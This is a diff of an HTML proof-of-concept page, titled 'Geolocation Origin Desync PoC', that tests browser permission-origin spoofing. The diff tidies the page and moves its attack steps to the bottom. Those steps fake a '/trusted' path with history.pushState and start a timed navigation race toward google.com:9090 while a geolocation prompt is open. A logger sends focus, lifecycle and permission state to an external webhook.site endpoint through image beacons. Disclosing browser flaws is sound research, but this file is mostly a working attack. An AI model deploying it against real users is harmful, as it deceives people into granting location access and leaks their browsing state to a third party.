@@ -4,36 +4,11 @@
 <meta charset="utf-8">
 <title>Geolocation Origin Desync PoC</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
-
 <style>
-body {
-  margin: 0;
-  font-family: -apple-system, BlinkMacSystemFont, system-ui;
-  background: #f5f5f7;
-}
-button {
-  font-size: 15px;
-  padding: 10px 14px;
-  border-radius: 10px;
-  border: none;
-  background: #007aff;
-  color: #fff;
-}
-#panel {
-  display: none;
-  max-width: 420px;
-  margin: 80px auto;
-  background: #fff;
-  padding: 24px;
-  border-radius: 16px;
-  box-shadow: 0 20px 60px rgba(0,0,0,.2);
-  text-align: center;
-}
-.notice {
-  margin-top: 14px;
-  font-size: 13px;
-  color: #b00020;
-}
+body { margin:0; font-family:-apple-system,BlinkMacSystemFont,system-ui; background:#f5f5f7; }
+button { font-size:15px; padding:10px 14px; border-radius:10px; border:none; background:#007aff; color:#fff; }
+#panel { display:none; max-width:420px; margin:80px auto; background:#fff; padding:24px; border-radius:16px; box-shadow:0 20px 60px rgba(0,0,0,.2); text-align:center; }
+.notice { margin-top:14px; font-size:13px; color:#b00020; }
 </style>
 </head>
 
@@ -46,10 +21,8 @@ button {
 <div id="panel">
   <h2>Request Location</h2>
   <p>Tap the button below to request Geolocation permission.</p>
-
   <button onclick="getLocation()">Get Location</button>
   <p id="output">Location: -</p>
-
   <div class="notice">
     Demo only — observe origin shown in permission dialog
   </div>
@@ -58,7 +31,9 @@ button {
 <script>
 const LOG_ENDPOINT = "https://webhook.site/562f0b30-3949-45c2-b3b0-0ac6de5470da";
 
-/* 🔥 CORS-proof forensic logger */
+/* ============================
+   SEMUA TAMBAHAN / LOGGING DI SINI
+   ============================ */
 function logEvent(type, extra = {}) {
   const data = {
     type,
@@ -70,11 +45,9 @@ function logEvent(type, extra = {}) {
     readyState: document.readyState,
     ...extra
   };
-  const params = new URLSearchParams(data).toString();
-  new Image().src = `${LOG_ENDPOINT}?${params}`;
+  new Image().src = `${LOG_ENDPOINT}?${new URLSearchParams(data)}`;
 }
 
-/* 🔥 Log global state */
 function logState(tag) {
   logEvent(tag, {
     hasFocus: document.hasFocus(),
@@ -87,12 +60,10 @@ function logState(tag) {
   });
 }
 
-/* UI elements */
 const panel   = document.getElementById('panel');
 const trigger = document.getElementById('trigger');
 const output  = document.getElementById('output');
 
-/* Get geolocation with enhanced logging */
 function getLocation() {
   if (!navigator.geolocation) return;
 
@@ -116,52 +87,17 @@ function getLocation() {
   );
 }
 
-/* Step 1: URL manipulation */
-trigger.onclick = () => {
-  logEvent("poc_started");
-  history.pushState({}, '', '/trusted');
-  logEvent("pushstate_done", { newPath: location.pathname });
-  panel.style.display = 'block';
-};
+/* Track focus & visibility */
+document.addEventListener("visibilitychange", () => logEvent("visibility_change", { visibility: document.visibilityState }));
+window.addEventListener("focus", () => logEvent("window_focus"));
+window.addEventListener("blur", () => logEvent("window_blur"));
 
-/* Step 2: Navigation race with multi-delay logging */
-function triggerRace() {
-  [10, 30, 50, 80, 120].forEach(ms => {
-    setTimeout(() => {
-      logEvent("race_tick", { delay: ms, url: location.href });
-    }, ms);
-  });
-}
+/* Page lifecycle events */
+["pagehide","beforeunload","freeze","resume"].forEach(ev =>
+  window.addEventListener(ev, () => logEvent("lifecycle_event", { event: ev }))
+);
 
-window.addEventListener('pageshow', () => {
-  logEvent("pageshow");
-  triggerRace();
-
-  requestAnimationFrame(() => {
-    requestAnimationFrame(() => {
-      setTimeout(() => {
-        logEvent("navigation_triggered", { target: "https://google.com:9090" });
-        location.href = 'https://google.com:9090';
-      }, 80);
-    });
-  });
-});
-
-/* Step 3: Track visibility & focus changes */
-document.addEventListener("visibilitychange", () => {
-  logEvent("visibility_change", { visibility: document.visibilityState });
-});
-window.addEventListener("focus", () => { logEvent("window_focus"); });
-window.addEventListener("blur", () => { logEvent("window_blur"); });
-
-/* Step 4: Track page lifecycle */
-["pagehide","beforeunload","freeze","resume"].forEach(ev => {
-  window.addEventListener(ev, () => {
-    logEvent("lifecycle_event", { event: ev });
-  });
-});
-
-/* Step 5: Snapshot permission states */
+/* Snapshot permissions */
 if (navigator.permissions) {
   ["geolocation","notifications"].forEach(p => {
     try {
@@ -172,9 +108,34 @@ if (navigator.permissions) {
   });
 }
 
-/* Initial state log */
 logState("initial_state");
 
+/* ============================
+   ⛔ BAGIAN INI TETAP PALING BAWAH & TIDAK BOLEH DIUBAH ⛔
+   ============================ */
+
+/*
+ * Step 1:
+ * Manipulate visible URL to a trusted-looking path
+ */
+trigger.onclick = () => {
+  history.pushState({}, '', '/trusted');
+  panel.style.display = 'block';
+};
+
+/*
+ * Step 2:
+ * Trigger a navigation race shortly after permission flow starts
+ */
+window.addEventListener('pageshow', () => {
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+      setTimeout(() => {
+        location.href = 'https://google.com:9090';
+      }, 80);
+    });
+  });
+});
 </script>
 
 </body>
